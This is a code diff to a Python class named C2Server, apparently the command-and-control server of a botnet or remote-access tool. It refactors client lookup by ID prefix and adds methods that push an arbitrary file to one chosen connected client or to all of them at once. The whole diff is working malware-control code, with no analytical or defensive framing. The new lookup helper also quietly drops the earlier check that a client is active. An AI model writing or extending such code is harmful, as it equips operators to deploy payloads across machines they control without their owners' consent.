@@ -71,14 +71,7 @@ class C2Server:
                     client.close()
 
     def client_command(self, uid_prefix, command):
-        target = None
-        with self.lock:
-            matches = [
-                c for uid, c in self.clients.items()
-                if uid.startswith(uid_prefix) and c.active
-            ]
-            if len(matches) == 1:
-                target = matches[0]
+        target = self.find_client_by_prefix(uid_prefix)
 
         if not target:
             self.log("[ERR] Client not found or ambiguous")
@@ -90,6 +83,72 @@ class C2Server:
                 target.set_time(time.time())
             except Exception:
                 target.close()
+
+    def find_client_by_prefix(self, uid_prefix):
+        with self.lock:
+            matches = [
+                c for uid, c in self.clients.items()
+                if uid.startswith(uid_prefix)
+            ]
+        if len(matches) == 1:
+            return matches[0]
+        return None
+
+    def push_file_to_client(self, uid_prefix, source_path, dest_path):
+        target = self.find_client_by_prefix(uid_prefix)
+        if not target:
+            self.log(f"[ERR] Client not found or ambiguous: {uid_prefix}")
+            return
+
+        try:
+            with open(source_path, 'rb') as f:
+                content = f.read()
+        except FileNotFoundError:
+            self.log(f"[ERR] File not found: {source_path}")
+            return
+        except Exception as e:
+            self.log(f"[ERR] Error reading file {source_path}: {e}")
+            return
+
+        command = f"PUSH|{dest_path}|{len(content)}\n".encode() + content
+
+        with target.lock:
+            try:
+                target.socket.sendall(command)
+                target.set_time(time.time())
+                self.log(f"Sent {source_path} to {target.unique_id[:8]}...")
+            except Exception as e:
+                self.log(f"[ERR] Failed to send file to {target.unique_id[:8]}: {e}")
+                target.close()
+
+    def push_file_to_all_clients(self, source_path, dest_path):
+        try:
+            with open(source_path, 'rb') as f:
+                content = f.read()
+        except FileNotFoundError:
+            self.log(f"[ERR] File not found: {source_path}")
+            return
+        except Exception as e:
+            self.log(f"[ERR] Error reading file {source_path}: {e}")
+            return
+
+        command = f"PUSH|{dest_path}|{len(content)}\n".encode() + content
+
+        with self.lock:
+            clients = list(self.clients.values())
+
+        for client in clients:
+            with client.lock:
+                if not client.active:
+                    continue
+                try:
+                    client.socket.sendall(command)
+                    client.set_time(time.time())
+                    self.log(f"Sent {source_path} to {client.unique_id[:8]}...")
+                except Exception as e:
+                    self.log(f"[ERR] Failed to send file to {client.unique_id[:8]}: {e}")
+                    client.close()
+
 
     def list_command(self):
         with self.lock:
